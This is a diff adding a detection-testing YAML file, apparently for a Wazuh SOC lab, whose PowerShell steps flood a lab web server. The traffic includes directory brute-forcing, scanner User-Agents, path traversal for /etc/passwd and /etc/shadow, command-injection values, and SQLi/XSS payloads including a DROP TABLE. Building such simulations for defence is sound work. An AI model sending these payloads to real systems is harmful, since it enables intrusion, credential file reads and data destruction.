@@ -1,0 +1,157 @@
+attack_technique: T1190
+display_name: Web Attack Flood Simulation (High Volume & Noise)
+
+description: >
+  Generates a "flood" of web logs to test Wazuh's load capacity and Frequency Rules.
+  Includes Directory Fuzzing (simulating DirBuster with continuous 404s), 
+  Malicious User-Agents (Nmap, Nikto, Nessus), Path Traversal (LFI), 
+  and High-Volume SQLi/XSS Fuzzing.
+
+author: SOC Lab
+version: 2.1
+platform: windows
+category: web-attacks
+severity: critical
+mode: simulation
+scope: cross-host
+
+mitre_techniques:
+  - T1190
+  - T1595.003
+  - T1110.001
+
+requirements:
+  os: [Windows 10, Windows 11]
+  software: [PowerShell 5.1+]
+  network: [LAN connection to Ubuntu target]
+
+atomic_tests:
+
+# ------------------------------------------------------------------
+# STEP 1 - T1595.003: Directory Enumeration (DirBuster/Gobuster Sim)
+# ------------------------------------------------------------------
+- name: '[1] T1595.003 - Directory Brute-force'
+  auto_generated_guid: WEBFLOOD-1111-0000-0000-000000000001
+  description: Sends 50 requests to non-existent paths to trigger 404 flood rules.
+  supported_platforms: [windows]
+  input_arguments:
+    target_ip:
+      description: Target Ubuntu IP
+      type: string
+      default: '192.168.1.164'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $target = "#{target_ip}"
+      $paths = @("admin","backup","test","db","sql","phpinfo.php","config.php","old","tmp","hidden")
+      Write-Host "[Step 1] Starting Directory Brute-force (Generating 404 errors)..."
+      
+      for ($i=1; $i -le 5; $i++) {
+        foreach ($p in $paths) {
+          $uri = "http://$target/$p$i"
+          try { Invoke-WebRequest -Uri $uri -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null } catch {}
+        }
+      }
+      Write-Host " -> Sent 50 directory scan requests."
+
+# ------------------------------------------------------------------
+# STEP 2 - T1595.002: Malicious User-Agent Flood
+# ------------------------------------------------------------------
+- name: '[2] T1595.002 - Bad User-Agents Flood'
+  auto_generated_guid: WEBFLOOD-2222-0000-0000-000000000002
+  description: Sends requests using known vulnerability scanner User-Agents.
+  supported_platforms: [windows]
+  input_arguments:
+    target_ip:
+      description: Target Ubuntu IP
+      type: string
+      default: '192.168.1.164'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $target = "#{target_ip}"
+      $bad_agents = @(
+        "Mozilla/5.0 Nikto/2.1.6",
+        "sqlmap/1.5.2#dev (http://sqlmap.org)",
+        "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
+        "Nessus",
+        "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
+      )
+      Write-Host "[Step 2] Sending requests with Malicious User-Agents..."
+      
+      foreach ($ua in $bad_agents) {
+        for ($i=1; $i -le 3; $i++) {
+          try { 
+            Invoke-WebRequest -Uri "http://$target/" -Headers @{"User-Agent"=$ua} -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null 
+          } catch {}
+        }
+      }
+      Write-Host " -> Finished deploying Scanner User-Agents."
+
+# ------------------------------------------------------------------
+# STEP 3 - T1190: LFI & Path Traversal Attack
+# ------------------------------------------------------------------
+- name: '[3] T1190 - Local File Inclusion (LFI) & Command Injection'
+  auto_generated_guid: WEBFLOOD-3333-0000-0000-000000000003
+  description: Attempts to read /etc/passwd and inject commands via search parameter.
+  supported_platforms: [windows]
+  input_arguments:
+    target_ip:
+      description: Target Ubuntu IP
+      type: string
+      default: '192.168.1.164'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $target = "#{target_ip}"
+      $payloads = @(
+        "../../../../../../../../etc/passwd",
+        "../..//../..//etc/shadow",
+        "| cat /etc/passwd",
+        "; id",
+        "`whoami`"
+      )
+      Write-Host "[Step 3] Sending LFI and Command Injection payloads..."
+      
+      foreach ($p in $payloads) {
+        $encoded = [uri]::EscapeDataString($p)
+        try { Invoke-WebRequest -Uri "http://$target/search.php?q=$encoded" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null } catch {}
+      }
+      Write-Host " -> LFI/CMD Injection complete."
+
+# ------------------------------------------------------------------
+# STEP 4 - T1190: High-Volume SQLi & XSS Fuzzing
+# ------------------------------------------------------------------
+- name: '[4] T1190 - SQLi & XSS Rapid Fuzzing'
+  auto_generated_guid: WEBFLOOD-4444-0000-0000-000000000004
+  description: Rapidly fires 50+ different SQLi and XSS payloads.
+  supported_platforms: [windows]
+  input_arguments:
+    target_ip:
+      description: Target Ubuntu IP
+      type: string
+      default: '192.168.1.164'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $target = "#{target_ip}"
+      $sqli = @("' OR 1=1--", "' UNION SELECT null, version()--", "admin' #", "' OR 'a'='a", "1; DROP TABLE users")
+      $xss = @("<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "javascript:alert(1)")
+      
+      Write-Host "[Step 4] Rapid Fuzzing SQLi and XSS (50+ requests)..."
+      
+      for ($i=1; $i -le 5; $i++) {
+        foreach ($sql in $sqli) {
+          $encoded = [uri]::EscapeDataString($sql)
+          try { Invoke-WebRequest -Uri "http://$target/search.php?q=$encoded" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null } catch {}
+        }
+        foreach ($x in $xss) {
+          $encoded = [uri]::EscapeDataString($x)
+          try { Invoke-WebRequest -Uri "http://$target/search.php?q=$encoded" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null } catch {}
+        }
+      }
+      Write-Host " -> Fuzzing complete. Check your Wazuh dashboard!"
